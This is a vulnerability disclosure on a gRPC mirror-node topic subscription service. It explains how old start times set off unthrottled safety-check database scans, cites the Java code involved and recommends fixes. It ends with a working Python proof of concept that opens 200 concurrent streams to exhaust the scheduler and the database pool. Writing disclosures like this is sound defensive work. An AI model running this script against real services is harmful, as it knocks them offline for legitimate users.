### Title
Unbounded Historical Scan via Safety-Check Gap Recovery Causes Bounded Elastic Scheduler Exhaustion (DoS)

### Summary
Any unauthenticated gRPC client can subscribe to a valid topic with `startTime` set to epoch 0 (or any arbitrarily old timestamp). After one second, the safety-check path in `TopicMessageServiceImpl` unconditionally fires an **unthrottled** `TopicMessageRetriever.retrieve()` call on the global `Schedulers.boundedElastic()` pool. With many concurrent such subscriptions, the bounded elastic thread pool and the underlying database connection pool are saturated, degrading or blocking all other subscribers.

### Finding Description

**Exact code path:**

`TopicMessageServiceImpl.subscribeTopic()` (lines 67–70) schedules a safety check for every subscription:

```java
Flux<TopicMessage> safetyCheck = Mono.delay(Duration.ofSeconds(1L))
        .filter(_ -> !topicContext.isComplete())
        .flatMapMany(_ -> missingMessages(topicContext, null))
        .subscribeOn(Schedulers.boundedElastic());   // global shared pool
``` [1](#0-0) 

`topicContext.isComplete()` returns `false` unconditionally when no `endTime` is set (the common indefinite-subscription case):

```java
boolean isComplete() {
    if (filter.getEndTime() == null) {
        return false;   // always false → safety check always fires
    }
    ...
}
``` [2](#0-1) 

`missingMessages(topicContext, null)` (the safety-check branch, lines 142–150) builds a `gapFilter` starting from the original user-supplied `startTime` (when no message has been delivered yet, `last == null`) and calls the retriever **unthrottled**:

```java
if (current == null) {
    long startTime = last != null
            ? last.getConsensusTimestamp() + 1
            : topicContext.getFilter().getStartTime();   // attacker-controlled
    var gapFilter =
            topicContext.getFilter().toBuilder().startTime(startTime).build();
    return topicMessageRetriever.retrieve(gapFilter, false);  // unthrottled
}
``` [3](#0-2) 

`PollingTopicMessageRetriever.retrieve(filter, false)` (unthrottled path) uses its own `Schedulers.boundedElastic()` instance for repeat scheduling and runs up to `unthrottled.maxPolls` database queries with `unthrottled.maxPageSize` rows each — with no early-exit until the limit is hit or `maxPolls` is exhausted:

```java
} else {
    RetrieverProperties.UnthrottledProperties unthrottled = retrieverProperties.getUnthrottled();
    numRepeats = unthrottled.getMaxPolls();
    frequency = unthrottled.getPollingFrequency();
    maxPageSize = unthrottled.getMaxPageSize();
}
``` [4](#0-3) 

**Root cause — failed assumption:** The `TopicMessageFilter` validation only enforces `startTime <= now()`, placing no lower bound on how far in the past a client may reach:

```java
@AssertTrue(message = "Start time must be before the current time")
public boolean isValidStartTime() {
    return startTime <= DomainUtils.now();   // epoch 0 is valid
}
``` [5](#0-4) 

There is no limit on concurrent subscribers, no per-client rate limiting, and no authentication at the gRPC layer.

**Exploit flow:**

1. Attacker opens N concurrent gRPC `subscribeTopic` streams with `startTime = 0` and no `endTime` on any valid topic.
2. Each subscription immediately starts a throttled historical retrieval from time 0 (potentially millions of rows).
3. After exactly 1 second, because `isComplete()` is always `false` for indefinite subscriptions, the safety check fires for all N subscriptions simultaneously.
4. Each safety check calls `retrieve(gapFilter, false)` — unthrottled — on the global `Schedulers.boundedElastic()` pool.
5. N concurrent unthrottled retrievals each issue up to `maxPolls` database queries, exhausting the bounded elastic thread pool and the DB connection pool.
6. Legitimate subscribers' safety checks, live-listener `publishOn` calls, and other reactor operations queued on the same pool are starved or rejected.

### Impact Explanation

- **Availability (High):** The bounded elastic scheduler is a global shared resource used by all reactive pipelines in the process. Saturating it with N unthrottled historical scans blocks all other subscribers from making progress, effectively causing a full service outage for the gRPC endpoint.
- **Database (High):** Each unthrottled retrieval issues repeated full-table-range queries from timestamp 0. With N attackers, the DB connection pool is exhausted, impacting the importer and REST API as well.
- **No data exfiltration** is required; the attacker only needs to open connections and let the timer fire.

### Likelihood Explanation

- **No authentication required:** The gRPC endpoint is publicly accessible; any client with network access can subscribe.
- **No rate limiting:** `subscriberCount` is a metric gauge only — it imposes no cap.
- **Trivially repeatable:** A single attacker script opening hundreds of gRPC streams with `startTime=0` is sufficient. The 1-second delay before the safety check fires is not a meaningful barrier.
- **Amplification:** Each subscription generates both a throttled historical scan AND an unthrottled safety-check scan concurrently, doubling the DB load per attacker connection.

### Recommendation

1. **Enforce a minimum `startTime` age** in `TopicMessageFilter.isValidStartTime()` (e.g., reject requests older than a configurable maximum lookback window such as 7 days).
2. **Cap concurrent subscribers per IP / globally** using a semaphore or connection limit enforced before `subscribeTopic` proceeds.
3. **Guard the safety check with a per-subscription flag** so it fires at most once and does not re-fire if the throttled historical retrieval is still in progress (check whether the historical flux has completed before triggering the unthrottled path).
4. **Move the safety-check retrieval to the throttled path** (`retrieve(gapFilter, true)`) so it respects page-size and polling-frequency limits.
5. **Use a dedicated, bounded scheduler** for safety-check work rather than the global `Schedulers.boundedElastic()`, so saturation cannot affect other pipelines.

### Proof of Concept

```python
import grpc
import threading
from proto import consensus_service_pb2_grpc, consensus_service_pb2
from proto.basic_types_pb2 import TopicID
from proto.timestamp_pb2 import Timestamp

TARGET = "mirror-node-grpc:5600"
TOPIC_ID = TopicID(topicNum=1)   # any valid topic
NUM_STREAMS = 200

def open_stream():
    channel = grpc.insecure_channel(TARGET)
    stub = consensus_service_pb2_grpc.ConsensusServiceStub(channel)
    query = consensus_service_pb2.ConsensusTopicQuery(
        topicID=TOPIC_ID,
        consensusStartTime=Timestamp(seconds=0, nanos=0),  # epoch 0 — far past
        # no endTime, no limit → isComplete() always false → safety check always fires
    )
    try:
        for _ in stub.subscribeTopic(query):
            pass  # drain slowly to keep stream open
    except Exception:
        pass

threads = [threading.Thread(target=open_stream) for _ in range(NUM_STREAMS)]
for t in threads:
    t.start()
# After ~1 second, 200 concurrent unthrottled DB scans from timestamp 0 fire simultaneously.
# Monitor: grpc latency spikes, DB connection pool exhaustion, bounded elastic queue depth.
```

### Citations

**File:** grpc/src/main/java/org/hiero/mirror/grpc/service/TopicMessageServiceImpl.java (L67-70)
```java
        Flux<TopicMessage> safetyCheck = Mono.delay(Duration.ofSeconds(1L))
                .filter(_ -> !topicContext.isComplete())
                .flatMapMany(_ -> missingMessages(topicContext, null))
                .subscribeOn(Schedulers.boundedElastic());
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/service/TopicMessageServiceImpl.java (L142-150)
```java
        if (current == null) {
            long startTime = last != null
                    ? last.getConsensusTimestamp() + 1
                    : topicContext.getFilter().getStartTime();
            var gapFilter =
                    topicContext.getFilter().toBuilder().startTime(startTime).build();
            log.info("Safety check triggering gap recovery query with filter {}", gapFilter);
            return topicMessageRetriever.retrieve(gapFilter, false);
        }
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/service/TopicMessageServiceImpl.java (L203-214)
```java
        boolean isComplete() {
            if (filter.getEndTime() == null) {
                return false;
            }

            if (filter.getEndTime() < startTime) {
                return true;
            }

            return Instant.ofEpochSecond(0, filter.getEndTime())
                    .plus(grpcProperties.getEndTimeInterval())
                    .isBefore(Instant.now());
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/retriever/PollingTopicMessageRetriever.java (L103-107)
```java
                RetrieverProperties.UnthrottledProperties unthrottled = retrieverProperties.getUnthrottled();
                numRepeats = unthrottled.getMaxPolls();
                frequency = unthrottled.getPollingFrequency();
                maxPageSize = unthrottled.getMaxPageSize();
            }
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/domain/TopicMessageFilter.java (L48-51)
```java
    @AssertTrue(message = "Start time must be before the current time")
    public boolean isValidStartTime() {
        return startTime <= DomainUtils.now();
    }
```
